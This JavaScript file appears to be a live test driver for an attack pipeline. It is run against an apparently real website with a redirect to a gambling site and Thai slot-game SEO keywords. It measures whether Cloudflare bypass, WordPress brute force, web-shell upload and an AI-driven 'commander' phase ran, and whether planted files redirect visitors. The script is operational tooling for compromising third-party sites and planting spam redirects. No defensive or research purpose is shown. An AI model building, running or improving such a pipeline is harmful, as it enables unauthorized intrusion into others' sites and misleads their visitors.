/**
 * Live Test Round 3b — Verify pipeline fixes:
 * 1. CF Bypass + WP Brute Force now run (vulnScan fallback)
 * 2. Upload phase respects global deadline (no 42-min hang)
 * 3. Pipeline finishes within 20 minutes
 */
const { runUnifiedAttackPipeline } = await import("../server/unified-attack-pipeline.ts");

const TARGET = "168-topgame.net";
const REDIRECT = "https://pggame168.com";
const LOG_FILE = "/home/ubuntu/friday-domaincity/scripts/live-test-round3b.log";

import { writeFileSync, appendFileSync } from "node:fs";
writeFileSync(LOG_FILE, `=== Live Test Round 3b ===\nStarted: ${new Date().toISOString()}\nTarget: ${TARGET}\nRedirect: ${REDIRECT}\n\n`);

function log(msg) {
  const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
  const line = `[${elapsed}s] ${msg}`;
  console.log(line);
  appendFileSync(LOG_FILE, line + "\n");
}

const startTime = Date.now();

// Track which phases actually ran
const phasesRan = new Set();
const phaseTimings = {};

// Key metrics to measure
const metrics = {
  cfBypassRan: false,
  wpBruteForceRan: false,
  aiCommanderRan: false,
  uploadMethodsUsed: 0,
  shellsAttempted: 0,
  totalPhases: 0,
  deadlineExpiredCount: 0,
  successfulUploads: 0,
  verifiedRedirects: 0,
};

log("Starting pipeline with 20-minute global timeout...\n");

try {
  const result = await runUnifiedAttackPipeline(
    {
      targetUrl: `https://${TARGET}`,
      redirectUrl: REDIRECT,
      seoKeywords: ["pg slot", "สล็อต", "เกมสล็อต"],
      globalTimeout: 20 * 60 * 1000, // 20 minutes
      maxLockouts: 3,
      enableAiCommander: true,
      aiCommanderMaxIterations: 5,
    },
    (event) => {
      const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
      const bar = "█".repeat(Math.floor(event.progress / 5)) + "░".repeat(20 - Math.floor(event.progress / 5));
      log(`[${bar}] ${event.progress.toFixed(2)}% | ${event.phase} > ${event.step}`);
      log(`         ${event.detail}`);

      // Track phases
      if (!phasesRan.has(event.phase)) {
        phasesRan.add(event.phase);
        phaseTimings[event.phase] = { start: Date.now() };
        metrics.totalPhases++;
      }
      if (event.step === "complete" || event.step === "error") {
        if (phaseTimings[event.phase]) {
          phaseTimings[event.phase].end = Date.now();
          phaseTimings[event.phase].duration = (Date.now() - phaseTimings[event.phase].start) / 1000;
        }
      }

      // Track key metrics
      if (event.phase === "cf_bypass") metrics.cfBypassRan = true;
      if (event.phase === "wp_brute_force") metrics.wpBruteForceRan = true;
      if (event.phase === "shellless" && event.step?.includes("ai_cmd")) metrics.aiCommanderRan = true;
      if (event.detail?.includes("deadline_expired")) metrics.deadlineExpiredCount++;
      if (event.step?.startsWith("shell_") && !event.step.includes("skip")) metrics.shellsAttempted++;
    },
  );

  const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);

  // Count results
  metrics.successfulUploads = result.uploadedFiles?.filter(f => f.verified)?.length || 0;
  metrics.verifiedRedirects = result.uploadedFiles?.filter(f => f.redirectWorks && f.redirectDestinationMatch)?.length || 0;

  log("\n\n========================================");
  log("  LIVE TEST ROUND 3b — RESULTS");
  log("========================================\n");
  log(`Total Duration: ${totalTime}s (${(totalTime / 60).toFixed(1)} min)`);
  log(`Within 20-min limit: ${parseFloat(totalTime) < 1200 ? "✅ YES" : "❌ NO"}`);
  log(`Pipeline Success: ${result.success}`);
  log("");
  log("--- KEY METRICS ---");
  log(`CF Bypass phase ran: ${metrics.cfBypassRan ? "✅ YES" : "❌ NO"}`);
  log(`WP Brute Force phase ran: ${metrics.wpBruteForceRan ? "✅ YES" : "❌ NO"}`);
  log(`AI Commander phase ran: ${metrics.aiCommanderRan ? "✅ YES" : "❌ NO"}`);
  log(`Total phases executed: ${metrics.totalPhases}`);
  log(`Shells attempted: ${metrics.shellsAttempted}`);
  log(`Deadline-expired early exits: ${metrics.deadlineExpiredCount}`);
  log(`Successful uploads: ${metrics.successfulUploads}`);
  log(`Verified redirects: ${metrics.verifiedRedirects}`);
  log("");
  log("--- PHASE TIMINGS ---");
  for (const [phase, timing] of Object.entries(phaseTimings)) {
    const dur = timing.duration ? `${timing.duration.toFixed(1)}s` : "still running";
    log(`  ${phase}: ${dur}`);
  }
  log("");
  log("--- AI DECISIONS ---");
  if (result.aiDecisions) {
    for (const d of result.aiDecisions) {
      log(`  ${d}`);
    }
  }
  log("");
  log("--- ERRORS ---");
  if (result.errors && result.errors.length > 0) {
    for (const e of result.errors) {
      log(`  ${e}`);
    }
  } else {
    log("  No errors");
  }
  log("");
  log("--- UPLOADED FILES ---");
  if (result.uploadedFiles && result.uploadedFiles.length > 0) {
    for (const f of result.uploadedFiles) {
      log(`  ${f.url} | method: ${f.method} | verified: ${f.verified} | redirect: ${f.redirectWorks} | match: ${f.redirectDestinationMatch}`);
    }
  } else {
    log("  No files uploaded");
  }

  // Write JSON results
  const jsonPath = LOG_FILE.replace(".log", "-results.json");
  writeFileSync(jsonPath, JSON.stringify({
    totalTime: parseFloat(totalTime),
    withinTimeLimit: parseFloat(totalTime) < 1200,
    success: result.success,
    metrics,
    phaseTimings,
    phasesRan: [...phasesRan],
    aiDecisions: result.aiDecisions,
    errors: result.errors,
    uploadedFiles: result.uploadedFiles?.map(f => ({
      url: f.url,
      method: f.method,
      verified: f.verified,
      redirectWorks: f.redirectWorks,
      redirectDestinationMatch: f.redirectDestinationMatch,
    })),
  }, null, 2));
  log(`\nResults saved to: ${jsonPath}`);

} catch (error) {
  const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
  log(`\n❌ PIPELINE CRASHED after ${totalTime}s: ${error.message}`);
  log(error.stack);
  
  const jsonPath = LOG_FILE.replace(".log", "-crash.json");
  writeFileSync(jsonPath, JSON.stringify({
    crashed: true,
    totalTime: parseFloat(totalTime),
    error: error.message,
    stack: error.stack,
    metrics,
    phasesRan: [...phasesRan],
    phaseTimings,
  }, null, 2));
  log(`Crash report saved to: ${jsonPath}`);
}
